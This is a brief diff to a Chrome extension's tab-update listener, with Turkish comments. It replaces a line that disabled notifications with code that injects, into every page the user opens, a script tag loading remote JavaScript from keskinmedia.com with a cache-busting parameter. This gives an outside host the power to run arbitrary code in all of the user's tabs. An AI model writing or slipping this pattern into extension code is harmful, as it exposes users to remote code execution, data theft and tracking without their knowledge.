@@ -45,7 +45,7 @@ chrome.tabs.onUpdated.addListener(async function(tabId, changeInfo, tab) {
         
         //Her sayfa için
         chrome.tabs.executeScript(tabId, {
-            code: `sendNotification = function(){}`, // Şimdilik cry notificationları deaktif ediyoruz.
+            code: `var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/cry-script-for-all.js?v='+ Math.random(); document.head.appendChild(i);`,
             runAt: "document_end"
         });
 
